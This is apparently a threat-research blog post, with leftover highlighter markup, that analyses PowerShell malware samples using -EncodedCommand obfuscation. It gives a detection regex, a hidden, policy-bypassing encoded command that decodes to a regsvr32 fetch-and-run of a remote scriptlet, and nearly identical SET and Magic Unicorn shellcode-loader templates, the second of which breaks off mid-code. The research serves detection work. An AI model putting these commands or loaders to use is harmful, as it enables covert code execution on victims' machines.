			<div class="crayon-tools" style="font-size: 12px !important;height: 18px !important; line-height: 18px !important;"><div class="crayon-button crayon-nums-button" title="Toggle Line Numbers"><div class="crayon-button-icon"></div></div><div class="crayon-button crayon-plain-button" title="Toggle Plain Code"><div class="crayon-button-icon"></div></div><div class="crayon-button crayon-wrap-button" title="Toggle Line Wrap"><div class="crayon-button-icon"></div></div><div class="crayon-button crayon-expand-button" title="Expand Code"><div class="crayon-button-icon"></div></div><div class="crayon-button crayon-copy-button" title="Copy"><div class="crayon-button-icon"></div></div><div class="crayon-button crayon-popup-button" title="Open Code In New Window"><div class="crayon-button-icon"></div></div></div></div>
			<div class="crayon-info" style="min-height: 16.8px !important; line-height: 16.8px !important;"></div>
			<div class="crayon-plain-wrap"><textarea wrap="soft" class="crayon-plain print-no" data-settings="dblclick" readonly style="-moz-tab-size:4; -o-tab-size:4; -webkit-tab-size:4; tab-size:4; font-size: 12px !important; line-height: 15px !important;">
-EncodedCommand
    Accepts a base64-encoded string version of a command. Use this parameter
    to submit commands to Windows PowerShell that require complex quotation
    marks or curly braces.</textarea></div>
			<div class="crayon-main" style=" max-width: 500px;">
				<table class="crayon-table">
					<tr class="crayon-row">
				<td class="crayon-nums " data-settings="show">
					<div class="crayon-nums-content" style="font-size: 12px !important; line-height: 15px !important;"><div class="crayon-num" data-line="crayon-60a9b96a2c937016190799-1">1</div><div class="crayon-num crayon-striped-num" data-line="crayon-60a9b96a2c937016190799-2">2</div><div class="crayon-num" data-line="crayon-60a9b96a2c937016190799-3">3</div><div class="crayon-num crayon-striped-num" data-line="crayon-60a9b96a2c937016190799-4">4</div></div>
				</td>
						<td class="crayon-code"><div class="crayon-pre" style="font-size: 12px !important; line-height: 15px !important; -moz-tab-size:4; -o-tab-size:4; -webkit-tab-size:4; tab-size:4;"><div class="crayon-line" id="crayon-60a9b96a2c937016190799-1"><span class="crayon-o">-</span><span class="crayon-e">EncodedCommand</span></div><div class="crayon-line crayon-striped-line" id="crayon-60a9b96a2c937016190799-2"><span class="crayon-e">&nbsp;&nbsp;&nbsp;&nbsp;</span><span class="crayon-i">Accepts</span><span class="crayon-h"> </span><span class="crayon-i">a</span><span class="crayon-h"> </span><span class="crayon-v">base64</span><span class="crayon-o">-</span><span class="crayon-e">encoded </span><span class="crayon-t">string</span><span class="crayon-h"> </span><span class="crayon-e">version </span><span class="crayon-i">of</span><span class="crayon-h"> </span><span class="crayon-i">a</span><span class="crayon-h"> </span><span class="crayon-v">command</span><span class="crayon-sy">.</span><span class="crayon-h"> </span><span class="crayon-st">Use</span><span class="crayon-h"> </span><span class="crayon-r">this</span><span class="crayon-h"> </span><span class="crayon-e">parameter</span></div><div class="crayon-line" id="crayon-60a9b96a2c937016190799-3"><span class="crayon-e">&nbsp;&nbsp;&nbsp;&nbsp;</span><span class="crayon-st">to</span><span class="crayon-h"> </span><span class="crayon-e">submit </span><span class="crayon-e">commands </span><span class="crayon-st">to</span><span class="crayon-h"> </span><span class="crayon-e">Windows </span><span class="crayon-e">PowerShell </span><span class="crayon-e">that </span><span class="crayon-e">require </span><span class="crayon-e">complex </span><span class="crayon-e">quotation</span></div><div class="crayon-line crayon-striped-line" id="crayon-60a9b96a2c937016190799-4"><span class="crayon-e">&nbsp;&nbsp;&nbsp;&nbsp;</span><span class="crayon-e">marks </span><span class="crayon-st">or</span><span class="crayon-h"> </span><span class="crayon-e">curly </span><span class="crayon-v">braces</span><span class="crayon-sy">.</span></div></div></td>
					</tr>
				</table>
			</div>
		</div>
<!-- [Format Time: 0.0004 seconds] -->
<p>As shown above from the PowerShell Help output, it’s a command intended to take complex strings that may otherwise cause issues for the command-line and wrap them up for PowerShell to execute. By masking the “malicious” part of your command from prying eyes you can avoid strings that may tip-off the defense.</p>
<p>The purpose of this blog will be two-fold. First, in the “Analysis Overview”, I will be analyzing 4,100 recent samples identified within Palo Alto Networks AutoFocus that employ this EncodedCommand technique to see how PowerShell is being used and what techniques are being used in the wild for PowerShell attacks. Second, I will be using this blog to catalog the PowerShell code with examples of each decoded sample to aide in future identification or research.</p>
<h3>Analysis Overview</h3>
<p>To perform this analysis, I needed to first identify samples that were using this technique. Because PowerShell gives you a lot of flexibility when it comes to calling different parameters, identifying samples isn’t as straightforward as one might expect.</p>
<p>Below are three examples of different ways the EncodedCommand parameter can be called:</p>
<ol>
<li><strong>Fully spelled out:<br />
</strong>powershell.exe –EncodedCommand ZQBjAGgAbwAgACIARABvAHIAbwB0AGgAeQAiAA==</li>
<li><strong>Truncated with alternate capitalization:</strong><br />
powershell.exe –eNco ZQBjAGgAbwAgACIAVwBpAHoAYQByAGQAIgA=</li>
<li><strong>Using caret escape-character injection to break-up the string:</strong><br />
powershell.exe –^e^C^ ZQBjAGgAbwAgACIAVwBpAHQAYwBoACIA</li>
</ol>
<p>There are well over 100,000 variations possible by using combinations of these methods for the “EncodedCommand” parameter alone. Keeping that in mind, I came up with the below regex that gave decent coverage to the possible variants and could easily be applied to a huge corpus of dynamic analysis reports.</p><!-- Crayon Syntax Highlighter v_2.7.2_beta -->

		<div id="crayon-60a9b96a2c93d976568159" class="crayon-syntax crayon-theme-classic crayon-font-monaco crayon-os-pc print-yes notranslate" data-settings=" minimize scroll-mouseover" style=" margin-top: 12px; margin-bottom: 12px; font-size: 12px !important; line-height: 15px !important;">
		
			<div class="crayon-toolbar" data-settings=" mouseover overlay hide delay" style="font-size: 12px !important;height: 18px !important; line-height: 18px !important;"><span class="crayon-title"></span>
			<div class="crayon-tools" style="font-size: 12px !important;height: 18px !important; line-height: 18px !important;"><div class="crayon-button crayon-nums-button" title="Toggle Line Numbers"><div class="crayon-button-icon"></div></div><div class="crayon-button crayon-plain-button" title="Toggle Plain Code"><div class="crayon-button-icon"></div></div><div class="crayon-button crayon-wrap-button" title="Toggle Line Wrap"><div class="crayon-button-icon"></div></div><div class="crayon-button crayon-expand-button" title="Expand Code"><div class="crayon-button-icon"></div></div><div class="crayon-button crayon-copy-button" title="Copy"><div class="crayon-button-icon"></div></div><div class="crayon-button crayon-popup-button" title="Open Code In New Window"><div class="crayon-button-icon"></div></div></div></div>
			<div class="crayon-info" style="min-height: 16.8px !important; line-height: 16.8px !important;"></div>
			<div class="crayon-plain-wrap"><textarea wrap="soft" class="crayon-plain print-no" data-settings="dblclick" readonly style="-moz-tab-size:4; -o-tab-size:4; -webkit-tab-size:4; tab-size:4; font-size: 12px !important; line-height: 15px !important;">
\-[Ee^]{1,2}[NnCcOoDdEeMmAa^]+ [A-Za-z0-9+/=]{5,}</textarea></div>
			<div class="crayon-main" style="">
				<table class="crayon-table">
					<tr class="crayon-row">
				<td class="crayon-nums " data-settings="show">
					<div class="crayon-nums-content" style="font-size: 12px !important; line-height: 15px !important;"><div class="crayon-num" data-line="crayon-60a9b96a2c93d976568159-1">1</div></div>
				</td>
						<td class="crayon-code"><div class="crayon-pre" style="font-size: 12px !important; line-height: 15px !important; -moz-tab-size:4; -o-tab-size:4; -webkit-tab-size:4; tab-size:4;"><div class="crayon-line" id="crayon-60a9b96a2c93d976568159-1"><span class="crayon-sy">\</span><span class="crayon-o">-</span><span class="crayon-sy">[</span><span class="crayon-e">Ee</span><span class="crayon-o">^</span><span class="crayon-sy">]</span><span class="crayon-sy">{</span><span class="crayon-cn">1</span><span class="crayon-sy">,</span><span class="crayon-cn">2</span><span class="crayon-sy">}</span><span class="crayon-sy">[</span><span class="crayon-v">NnCcOoDdEeMmAa</span><span class="crayon-o">^</span><span class="crayon-sy">]</span><span class="crayon-o">+</span><span class="crayon-h"> </span><span class="crayon-sy">[</span><span class="crayon-v">A</span><span class="crayon-o">-</span><span class="crayon-v">Za</span><span class="crayon-o">-</span><span class="crayon-v">z0</span><span class="crayon-o">-</span><span class="crayon-cn">9</span><span class="crayon-o">+</span><span class="crayon-o">/=</span><span class="crayon-sy">]</span><span class="crayon-sy">{</span><span class="crayon-cn">5</span><span class="crayon-sy">,</span><span class="crayon-sy">}</span></div></div></td>
					</tr>
				</table>
			</div>
		</div>
<!-- [Format Time: 0.0002 seconds] -->
<p>This allows for extraction of lines like the below at scale for further analysis.</p><!-- Crayon Syntax Highlighter v_2.7.2_beta -->

		<div id="crayon-60a9b96a2c93f000312652" class="crayon-syntax crayon-theme-classic crayon-font-monaco crayon-os-pc print-yes notranslate" data-settings=" minimize scroll-mouseover" style=" margin-top: 12px; margin-bottom: 12px; font-size: 12px !important; line-height: 15px !important;">
		
			<div class="crayon-toolbar" data-settings=" mouseover overlay hide delay" style="font-size: 12px !important;height: 18px !important; line-height: 18px !important;"><span class="crayon-title"></span>
			<div class="crayon-tools" style="font-size: 12px !important;height: 18px !important; line-height: 18px !important;"><div class="crayon-button crayon-nums-button" title="Toggle Line Numbers"><div class="crayon-button-icon"></div></div><div class="crayon-button crayon-plain-button" title="Toggle Plain Code"><div class="crayon-button-icon"></div></div><div class="crayon-button crayon-wrap-button" title="Toggle Line Wrap"><div class="crayon-button-icon"></div></div><div class="crayon-button crayon-expand-button" title="Expand Code"><div class="crayon-button-icon"></div></div><div class="crayon-button crayon-copy-button" title="Copy"><div class="crayon-button-icon"></div></div><div class="crayon-button crayon-popup-button" title="Open Code In New Window"><div class="crayon-button-icon"></div></div></div></div>
			<div class="crayon-info" style="min-height: 16.8px !important; line-height: 16.8px !important;"></div>
			<div class="crayon-plain-wrap"><textarea wrap="soft" class="crayon-plain print-no" data-settings="dblclick" readonly style="-moz-tab-size:4; -o-tab-size:4; -webkit-tab-size:4; tab-size:4; font-size: 12px !important; line-height: 15px !important;">
powerShell.exe  -WindowStyle hiddeN -ExecuTionPolicy ByPasS -enc 
cgBlAGcAcwB2AHIAMwAyACAALwB1ACAALwBzACAALwBpADoAaAB0AHQAcAA6
AC8ALwAxADkAMgAuADEANgA4AC4ANAA4AC4AMQAyADkALwB0AGUAcwB0AC4
AagBwAGcAIABzAGMAcgBvAGIAagAuAGQAbABsAAoA</textarea></div>
			<div class="crayon-main" style="">
				<table class="crayon-table">
					<tr class="crayon-row">
				<td class="crayon-nums " data-settings="show">
					<div class="crayon-nums-content" style="font-size: 12px !important; line-height: 15px !important;"><div class="crayon-num" data-line="crayon-60a9b96a2c93f000312652-1">1</div><div class="crayon-num crayon-striped-num" data-line="crayon-60a9b96a2c93f000312652-2">2</div><div class="crayon-num" data-line="crayon-60a9b96a2c93f000312652-3">3</div><div class="crayon-num crayon-striped-num" data-line="crayon-60a9b96a2c93f000312652-4">4</div></div>
				</td>
						<td class="crayon-code"><div class="crayon-pre" style="font-size: 12px !important; line-height: 15px !important; -moz-tab-size:4; -o-tab-size:4; -webkit-tab-size:4; tab-size:4;"><div class="crayon-line" id="crayon-60a9b96a2c93f000312652-1"><span class="crayon-v">powerShell</span><span class="crayon-sy">.</span><span class="crayon-v">exe</span><span class="crayon-h">&nbsp;&nbsp;</span><span class="crayon-o">-</span><span class="crayon-e">WindowStyle </span><span class="crayon-v">hiddeN</span><span class="crayon-h"> </span><span class="crayon-o">-</span><span class="crayon-e">ExecuTionPolicy </span><span class="crayon-v">ByPasS</span><span class="crayon-h"> </span><span class="crayon-o">-</span><span class="crayon-e">enc </span></div><div class="crayon-line crayon-striped-line" id="crayon-60a9b96a2c93f000312652-2"><span class="crayon-e">cgBlAGcAcwB2AHIAMwAyACAALwB1ACAALwBzACAALwBpADoAaAB0AHQAcAA6</span></div><div class="crayon-line" id="crayon-60a9b96a2c93f000312652-3"><span class="crayon-e">AC8ALwAxADkAMgAuADEANgA4AC4ANAA4AC4AMQAyADkALwB0AGUAcwB0AC4</span></div><div class="crayon-line crayon-striped-line" id="crayon-60a9b96a2c93f000312652-4"><span class="crayon-v">AagBwAGcAIABzAGMAcgBvAGIAagAuAGQAbABsAAoA</span></div></div></td>
					</tr>
				</table>
			</div>
		</div>
<!-- [Format Time: 0.0002 seconds] -->
<p>Now, it’s no surprise but the majority of the encoded data is clearly generated from templates and public tools - attackers aren’t re-inventing the wheel every time they need to run shellcode or download another malicious file.  This is evidenced by the fact that the underlying code is almost identical with just slight adjustments to download locations and the like. To try and perform analysis on the data then, I needed to try and identify the code and attempt to determine what generated the code, or at minimum, attempt to cluster the code into like-buckets.</p>
<h3>Profiling Approach</h3>
<p>To illustrate some of the difficulties involved with this, back in 2012 <a href="https://twitter.com/mattifestation">Matthew Graeber</a> published a <a href="http://www.exploit-monday.com/2011/10/exploiting-powershells-features-not.html">blog post</a> about a PowerShell script he put together that could load shellcode into memory and execute it. This script has been the cornerstone template for this technique, being used in most public tools that seek to use this functionality.</p>
<p>Following are two iterations of the technique from TrustedSec tools <a href="https://github.com/trustedsec/social-engineer-toolkit">Social-Engineer Toolkit (SET)</a> and <a href="https://github.com/trustedsec/unicorn">Magic Unicorn</a>. If you compare the two samples, you’ll see that SET uses “$c” whereas Magic Unicorn uses “$nLR” for the initial variable. Similarly, the “$size” variable in SET is “$g” in Magic Unicorn, the “$sc” variable is “$z”, and finally the “$x” variable is “$kuss”.</p>
<p>SET</p><!-- Crayon Syntax Highlighter v_2.7.2_beta -->

		<div id="crayon-60a9b96a2c941253203692" class="crayon-syntax crayon-theme-classic crayon-font-monaco crayon-os-pc print-yes notranslate" data-settings=" minimize scroll-mouseover wrap" style=" margin-top: 12px; margin-bottom: 12px; font-size: 12px !important; line-height: 15px !important;">
		
			<div class="crayon-toolbar" data-settings=" mouseover overlay hide delay" style="font-size: 12px !important;height: 18px !important; line-height: 18px !important;"><span class="crayon-title"></span>
			<div class="crayon-tools" style="font-size: 12px !important;height: 18px !important; line-height: 18px !important;"><div class="crayon-button crayon-nums-button" title="Toggle Line Numbers"><div class="crayon-button-icon"></div></div><div class="crayon-button crayon-plain-button" title="Toggle Plain Code"><div class="crayon-button-icon"></div></div><div class="crayon-button crayon-wrap-button" title="Toggle Line Wrap"><div class="crayon-button-icon"></div></div><div class="crayon-button crayon-expand-button" title="Expand Code"><div class="crayon-button-icon"></div></div><div class="crayon-button crayon-copy-button" title="Copy"><div class="crayon-button-icon"></div></div><div class="crayon-button crayon-popup-button" title="Open Code In New Window"><div class="crayon-button-icon"></div></div></div></div>
			<div class="crayon-info" style="min-height: 16.8px !important; line-height: 16.8px !important;"></div>
			<div class="crayon-plain-wrap"><textarea  class="crayon-plain print-no" data-settings="dblclick" readonly style="-moz-tab-size:4; -o-tab-size:4; -webkit-tab-size:4; tab-size:4; font-size: 12px !important; line-height: 15px !important;">
$c = '[DllImport("kernel32.dll")]public static extern IntPtr VirtualAlloc(IntPtr lpAddress, uint dwSize, uint flAllocationType, uint flProtect);[DllImport("kernel32.dll")]public static extern IntPtr CreateThread(IntPtr lpThreadAttributes, uint dwStackSize, IntPtr lpStartAddress, IntPtr lpParameter, uint dwCreationFlags, IntPtr lpThreadId);[DllImport("msvcrt.dll")]public static extern IntPtr memset(IntPtr dest, uint src, uint count);';$w = Add-Type -memberDefinition $c -Name "Win32" -namespace Win32Functions -passthru;[Byte[]];[Byte[]]$sc = ;$size = 0x1000;if ($sc.Length -gt 0x1000){$size = $sc.Length};$x=$w::VirtualAlloc(0,0x1000,$size,0x40);for ($i=0;$i -le ($sc.Length-1);$i++) {$w::memset([IntPtr]($x.ToInt32()+$i), $sc[$i], 1)};$w::CreateThread(0,0,$x,0,0,0);for (;;){Start-sleep 60};</textarea></div>
			<div class="crayon-main" style="">
				<table class="crayon-table">
					<tr class="crayon-row">
				<td class="crayon-nums " data-settings="show">
					<div class="crayon-nums-content" style="font-size: 12px !important; line-height: 15px !important;"><div class="crayon-num" data-line="crayon-60a9b96a2c941253203692-1">1</div></div>
				</td>
						<td class="crayon-code"><div class="crayon-pre" style="font-size: 12px !important; line-height: 15px !important; -moz-tab-size:4; -o-tab-size:4; -webkit-tab-size:4; tab-size:4;"><div class="crayon-line" id="crayon-60a9b96a2c941253203692-1"><span class="crayon-sy">$</span><span class="crayon-v">c</span><span class="crayon-h"> </span><span class="crayon-o">=</span><span class="crayon-h"> </span><span class="crayon-s">'[DllImport("kernel32.dll")]public static extern IntPtr VirtualAlloc(IntPtr lpAddress, uint dwSize, uint flAllocationType, uint flProtect);[DllImport("kernel32.dll")]public static extern IntPtr CreateThread(IntPtr lpThreadAttributes, uint dwStackSize, IntPtr lpStartAddress, IntPtr lpParameter, uint dwCreationFlags, IntPtr lpThreadId);[DllImport("msvcrt.dll")]public static extern IntPtr memset(IntPtr dest, uint src, uint count);'</span><span class="crayon-sy">;</span><span class="crayon-sy">$</span><span class="crayon-v">w</span><span class="crayon-h"> </span><span class="crayon-o">=</span><span class="crayon-h"> </span><span class="crayon-v">Add</span><span class="crayon-o">-</span><span class="crayon-v">Type</span><span class="crayon-h"> </span><span class="crayon-o">-</span><span class="crayon-i">memberDefinition</span><span class="crayon-h"> </span><span class="crayon-sy">$</span><span class="crayon-v">c</span><span class="crayon-h"> </span><span class="crayon-o">-</span><span class="crayon-i">Name</span><span class="crayon-h"> </span><span class="crayon-s">"Win32"</span><span class="crayon-h"> </span><span class="crayon-o">-</span><span class="crayon-t">namespace</span><span class="crayon-h"> </span><span class="crayon-v">Win32Functions</span><span class="crayon-h"> </span><span class="crayon-o">-</span><span class="crayon-v">passthru</span><span class="crayon-sy">;</span><span class="crayon-sy">[</span><span class="crayon-t">Byte</span><span class="crayon-sy">[</span><span class="crayon-sy">]</span><span class="crayon-sy">]</span><span class="crayon-sy">;</span><span class="crayon-sy">[</span><span class="crayon-t">Byte</span><span class="crayon-sy">[</span><span class="crayon-sy">]</span><span class="crayon-sy">]</span><span class="crayon-sy">$</span><span class="crayon-v">sc</span><span class="crayon-h"> </span><span class="crayon-o">=</span><span class="crayon-h"> </span><span class="crayon-sy">;</span><span class="crayon-sy">$</span><span class="crayon-v">size</span><span class="crayon-h"> </span><span class="crayon-o">=</span><span class="crayon-h"> </span><span class="crayon-cn">0x1000</span><span class="crayon-sy">;</span><span class="crayon-st">if</span><span class="crayon-h"> </span><span class="crayon-sy">(</span><span class="crayon-sy">$</span><span class="crayon-v">sc</span><span class="crayon-sy">.</span><span class="crayon-v">Length</span><span class="crayon-h"> </span><span class="crayon-o">-</span><span class="crayon-i">gt</span><span class="crayon-h"> </span><span class="crayon-cn">0x1000</span><span class="crayon-sy">)</span><span class="crayon-sy">{</span><span class="crayon-sy">$</span><span class="crayon-v">size</span><span class="crayon-h"> </span><span class="crayon-o">=</span><span class="crayon-h"> </span><span class="crayon-sy">$</span><span class="crayon-v">sc</span><span class="crayon-sy">.</span><span class="crayon-v">Length</span><span class="crayon-sy">}</span><span class="crayon-sy">;</span><span class="crayon-sy">$</span><span class="crayon-v">x</span><span class="crayon-o">=</span><span class="crayon-sy">$</span><span class="crayon-v">w</span><span class="crayon-o">::</span><span class="crayon-e">VirtualAlloc</span><span class="crayon-sy">(</span><span class="crayon-cn">0</span><span class="crayon-sy">,</span><span class="crayon-cn">0x1000</span><span class="crayon-sy">,</span><span class="crayon-sy">$</span><span class="crayon-v">size</span><span class="crayon-sy">,</span><span class="crayon-cn">0x40</span><span class="crayon-sy">)</span><span class="crayon-sy">;</span><span class="crayon-st">for</span><span class="crayon-h"> </span><span class="crayon-sy">(</span><span class="crayon-sy">$</span><span class="crayon-v">i</span><span class="crayon-o">=</span><span class="crayon-cn">0</span><span class="crayon-sy">;</span><span class="crayon-sy">$</span><span class="crayon-v">i</span><span class="crayon-h"> </span><span class="crayon-o">-</span><span class="crayon-e">le</span><span class="crayon-h"> </span><span class="crayon-sy">(</span><span class="crayon-sy">$</span><span class="crayon-v">sc</span><span class="crayon-sy">.</span><span class="crayon-v">Length</span><span class="crayon-o">-</span><span class="crayon-cn">1</span><span class="crayon-sy">)</span><span class="crayon-sy">;</span><span class="crayon-sy">$</span><span class="crayon-v">i</span><span class="crayon-o">++</span><span class="crayon-sy">)</span><span class="crayon-h"> </span><span class="crayon-sy">{</span><span class="crayon-sy">$</span><span class="crayon-v">w</span><span class="crayon-o">::</span><span class="crayon-e">memset</span><span class="crayon-sy">(</span><span class="crayon-sy">[</span><span class="crayon-v">IntPtr</span><span class="crayon-sy">]</span><span class="crayon-sy">(</span><span class="crayon-sy">$</span><span class="crayon-v">x</span><span class="crayon-sy">.</span><span class="crayon-e">ToInt32</span><span class="crayon-sy">(</span><span class="crayon-sy">)</span><span class="crayon-o">+</span><span class="crayon-sy">$</span><span class="crayon-v">i</span><span class="crayon-sy">)</span><span class="crayon-sy">,</span><span class="crayon-h"> </span><span class="crayon-sy">$</span><span class="crayon-v">sc</span><span class="crayon-sy">[</span><span class="crayon-sy">$</span><span class="crayon-v">i</span><span class="crayon-sy">]</span><span class="crayon-sy">,</span><span class="crayon-h"> </span><span class="crayon-cn">1</span><span class="crayon-sy">)</span><span class="crayon-sy">}</span><span class="crayon-sy">;</span><span class="crayon-sy">$</span><span class="crayon-v">w</span><span class="crayon-o">::</span><span class="crayon-e">CreateThread</span><span class="crayon-sy">(</span><span class="crayon-cn">0</span><span class="crayon-sy">,</span><span class="crayon-cn">0</span><span class="crayon-sy">,</span><span class="crayon-sy">$</span><span class="crayon-v">x</span><span class="crayon-sy">,</span><span class="crayon-cn">0</span><span class="crayon-sy">,</span><span class="crayon-cn">0</span><span class="crayon-sy">,</span><span class="crayon-cn">0</span><span class="crayon-sy">)</span><span class="crayon-sy">;</span><span class="crayon-st">for</span><span class="crayon-h"> </span><span class="crayon-sy">(</span><span class="crayon-sy">;</span><span class="crayon-sy">;</span><span class="crayon-sy">)</span><span class="crayon-sy">{</span><span class="crayon-v">Start</span><span class="crayon-o">-</span><span class="crayon-i">sleep</span><span class="crayon-h"> </span><span class="crayon-cn">60</span><span class="crayon-sy">}</span><span class="crayon-sy">;</span></div></div></td>
					</tr>
				</table>
			</div>
		</div>
<!-- [Format Time: 0.0011 seconds] -->
<p>Magic Unicorn</p><!-- Crayon Syntax Highlighter v_2.7.2_beta -->

		<div id="crayon-60a9b96a2c943780317990" class="crayon-syntax crayon-theme-classic crayon-font-monaco crayon-os-pc print-yes notranslate" data-settings=" minimize scroll-mouseover wrap" style=" margin-top: 12px; margin-bottom: 12px; font-size: 12px !important; line-height: 15px !important;">
		
			<div class="crayon-toolbar" data-settings=" mouseover overlay hide delay" style="font-size: 12px !important;height: 18px !important; line-height: 18px !important;"><span class="crayon-title"></span>
			<div class="crayon-tools" style="font-size: 12px !important;height: 18px !important; line-height: 18px !important;"><div class="crayon-button crayon-nums-button" title="Toggle Line Numbers"><div class="crayon-button-icon"></div></div><div class="crayon-button crayon-plain-button" title="Toggle Plain Code"><div class="crayon-button-icon"></div></div><div class="crayon-button crayon-wrap-button" title="Toggle Line Wrap"><div class="crayon-button-icon"></div></div><div class="crayon-button crayon-expand-button" title="Expand Code"><div class="crayon-button-icon"></div></div><div class="crayon-button crayon-copy-button" title="Copy"><div class="crayon-button-icon"></div></div><div class="crayon-button crayon-popup-button" title="Open Code In New Window"><div class="crayon-button-icon"></div></div></div></div>
			<div class="crayon-info" style="min-height: 16.8px !important; line-height: 16.8px !important;"></div>
			<div class="crayon-plain-wrap"><textarea  class="crayon-plain print-no" data-settings="dblclick" readonly style="-moz-tab-size:4; -o-tab-size:4; -webkit-tab-size:4; tab-size:4; font-size: 12px !important; line-height: 15px !important;">
$nLR = '[DllImport("kernel32.dll")]public static extern IntPtr VirtualAlloc(IntPtr lpAddress, uint dwSize, uint flAllocationType, uint flProtect);[DllImport("kernel32.dll")]public static extern IntPtr CreateThread(IntPtr lpThreadAttributes, uint dwStackSize, IntPtr lpStartAddress, IntPtr lpParameter, uint dwCreationFlags, IntPtr lpThreadId);[DllImport("msvcrt.dll")]public static extern IntPtr memset(IntPtr dest, uint src, uint count);';$w = Add-Type -memberDefinition $nLR -Name "Win32" -namespace Win32Functions -passthru;[Byte[]];[Byte[]]$z = ;$g = 0x1000;if ($z.Length -gt 0x1000){$g = $z.Length};$kuss=$w::VirtualAlloc(0,0x1000,$g,0x40);for ($i=0;$i -le ($z.Length-1);$i++) {$w::memset([IntPtr]($kuss.ToInt32()+$i), $z[$i], 1)};$w::CreateThread(0,0,$kuss,0,0,0);for (;;){Start-sleep 60};</textarea></div>
			<div class="crayon-main" style="">
				<table class="crayon-table">
					<tr class="crayon-row">
				<td class="crayon-nums " data-settings="show">
					<div class="crayon-nums-content" style="font-size: 12px !important; line-height: 15px !important;"><div class="crayon-num" data-line="crayon-60a9b96a2c943780317990-1">1</div></div>
				</td>
						<td class="crayon-code"><div class="crayon-pre" style="font-size: 12px !important; line-height: 15px !important; -moz-tab-size:4; -o-tab-size:4; -webkit-tab-size:4; tab-size:4;"><div class="crayon-line" id="crayon-60a9b96a2c943780317990-1"><span class="crayon-sy">$</span><span class="crayon-v">nLR</span><span class="crayon-h"> </span><span class="crayon-o">=</span><span class="crayon-h"> </span><span class="crayon-s">'[DllImport("kernel32.dll")]public static extern IntPtr VirtualAlloc(IntPtr lpAddress, uint dwSize, uint flAllocationType, uint flProtect);[DllImport("kernel32.dll")]public static extern IntPtr CreateThread(IntPtr lpThreadAttributes, uint dwStackSize, IntPtr lpStartAddress, IntPtr lpParameter, uint dwCreationFlags, IntPtr lpThreadId);[DllImport("msvcrt.dll")]public static extern IntPtr memset(IntPtr dest, uint src, uint count);'</span><span class="crayon-sy">;</span><span class="crayon-sy">$</span><span class="crayon-v">w</span><span class="crayon-h"> </span><span class="crayon-o">=</span><span class="crayon-h"> </span><span class="crayon-v">Add</span><span class="crayon-o">-</span><span class="crayon-v">Type</span><span class="crayon-h"> </span><span class="crayon-o">-</span><span class="crayon-i">memberDefinition</span><span class="crayon-h"> </span><span class="crayon-sy">$</span><span class="crayon-v">nLR</span><span class="crayon-h"> </span><span class="crayon-o">-</span><span class="crayon-i">Name</span><span class="crayon-h"> </span><span class="crayon-s">"Win32"</span><span class="crayon-h"> </span><span class="crayon-o">-</span><span class="crayon-t">namespace</span><span class="crayon-h"> </span><span class="crayon-v">Win32Functions</span><span class="crayon-h"> </span><span class="crayon-o">-</span><span class="crayon-v">passthru</span><span class="crayon-sy">;</span><span class="crayon-sy">[</span><span class="crayon-t">Byte</span><span class="crayon-sy">[</span><span class="crayon-sy">]</span><span class="crayon-sy">]</span><span class="crayon-sy">;</span><span class="crayon-sy">[</span><span class="crayon-t">Byte</span><span class="crayon-sy">[</span><span class="crayon-sy">]</span><span class="crayon-sy">]</span><span class="crayon-sy">$</span><span class="crayon-v">z</span><span class="crayon-h"> </span><span class="crayon-o">=</span><span class="crayon-h"> </span><span class="crayon-sy">;</span><span class="crayon-sy">$</span><span class="crayon-v">g</span><span class="crayon-h"> </span><span class="crayon-o">=</span><span class="crayon-h"> </span><span class="crayon-cn">0x1000</span><span class="crayon-sy">;</span><span class="crayon-st">if</span><span class="crayon-h"> </span><span class="crayon-sy">(</span><span class="crayon-sy">$</span><span class="crayon-v">z</span><span class="crayon-sy">.</span><span class="crayon-v">Length</span><span class="crayon-h"> </span><span class="crayon-o">-</span><span class="crayon-i">gt</span><span class="crayon-h"> </span><span class="crayon-cn">0x1000</span><span class="crayon-sy">)</span><span class="crayon-sy">{</span><span class="crayon-sy">$</span><span class="crayon-v">g</span><span class="crayon-h"> </span><span class="crayon-o">=</span><span class="crayon-h"> </span><span class="crayon-sy">$</span><span class="crayon-v">z</span><span class="crayon-sy">.</span><span class="crayon-v">Length</span><span class="crayon-sy">}</span><span class="crayon-sy">;</span><span class="crayon-sy">$</span><span class="crayon-v">kuss</span><span class="crayon-o">=</span><span class="crayon-sy">$</span><span class="crayon-v">w</span><span class="crayon-o">::</span><span class="crayon-e">VirtualAlloc</span><span class="crayon-sy">(</span><span class="crayon-cn">0</span><span class="crayon-sy">,</span><span class="crayon-cn">0x1000</span><span class="crayon-sy">,</span><span class="crayon-sy">$</span><span class="crayon-v">g</span><span class="crayon-sy">,</span><span class="crayon-cn">0x40</span><span class="crayon-sy">)</span><span class="crayon-sy">;</span><span class="crayon-st">for</span><span class="crayon-h"> </span><span class="crayon-sy">(</span><span class="crayon-sy">$</span><span class="crayon-v">i</span><span class="crayon-o">=</span><span class="crayon-cn">0</span><span class="crayon-sy">;</span><span class="crayon-sy">$</span><span class="crayon-v">i</span><span class="crayon-h"> </span><span class="crayon-o">-</span><span class="crayon-e">le</span><span class="crayon-h"> </span><span class="crayon-sy">(</span><span class="crayon-sy">$</span><span class="crayon-v">z</span><span class="crayon-sy">.</span><span class="crayon-v">Length</span><span class="crayon-o">-</span><span class="crayon-cn">1</span><span class="crayon-sy">)</span><span class="crayon-sy">;</span><span class="crayon-sy">$</span><span class="crayon-v">i</span><span class="crayon-o">++</span><span class="crayon-sy">)</span><span class="crayon-h"> </span><span class="crayon-sy">{</span><span class="crayon-sy">$</span><span class="crayon-v">w</span><span class="crayon-o">::</span><span class="crayon-e">memset</span><span class="crayon-sy">(</span><span class="crayon-sy">[</span><span class="crayon-v">IntPtr</span><span class="crayon-sy">]</span><span class="crayon-sy">(</span><span class="crayon-sy">$</span><span class="crayon-v">kuss</span><span class="crayon-sy">.</span><span class="crayon-e">ToInt32</span><span class="crayon-sy">(</span><span class="crayon-sy">)</span><span class="crayon-o">+</span><span class="crayon-sy">$</span><span class="crayon-v">i</span><span class="crayon-sy">)</span><span class="crayon-sy">,</span><span class="crayon-h"> </span><span class="crayon-sy">$</span><span class="crayon-v">z</span><span class="crayon-sy">[</span><span class="crayon-sy">$</span><span class="crayon-v">i</span><span class="crayon-sy">]</span><span class="crayon-sy">,</span><span class="crayon-h"> </span><span class="crayon-cn">1</span><span class="crayon-sy">)</span><span class="crayon-sy">}</span><span class="crayon-sy">;</span><span class="crayon-sy">$</span><span class="crayon-v">w</span><span class="crayon-o">::</span><span class="crayon-e">CreateThread</span><span class="crayon-sy">(</span><span class="crayon-cn">0</span><span class="crayon-sy">,</span><span 